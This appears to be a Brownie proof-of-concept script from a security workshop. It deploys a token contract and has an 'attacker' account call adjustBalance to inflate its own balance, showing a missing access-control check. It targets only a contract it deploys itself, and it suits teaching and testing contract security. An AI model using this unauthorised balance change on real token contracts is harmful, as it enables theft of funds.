from brownie import HackSouthToken,accounts
from brownie.convert import to_bytes
from brownie.utils import color

name = "HACKSOUTH"
symbol = "HSO"
amount = 10_000_000_000_000_000_000_000

def deploy_contracts():
    return HackSouthToken.deploy(name, symbol, accounts[0], amount, {"from":accounts[0]})
    
def main():
    hacksouth_token = deploy_contracts()

    # show initial balance
    print("{}[+] balance (attacker): {}{}".format(color('green'), hacksouth_token.balanceOf(accounts[1], {"from":accounts[1]}), color('reset')))

    # update balance
    hacksouth_token.adjustBalance(accounts[1], 1_000_000, {"from":accounts[1]})
    
    # show updated balance
    print("{}[+] balance (attacker): {}{}".format(color('green'), hacksouth_token.balanceOf(accounts[1], {"from":accounts[1]}), color('reset')))
    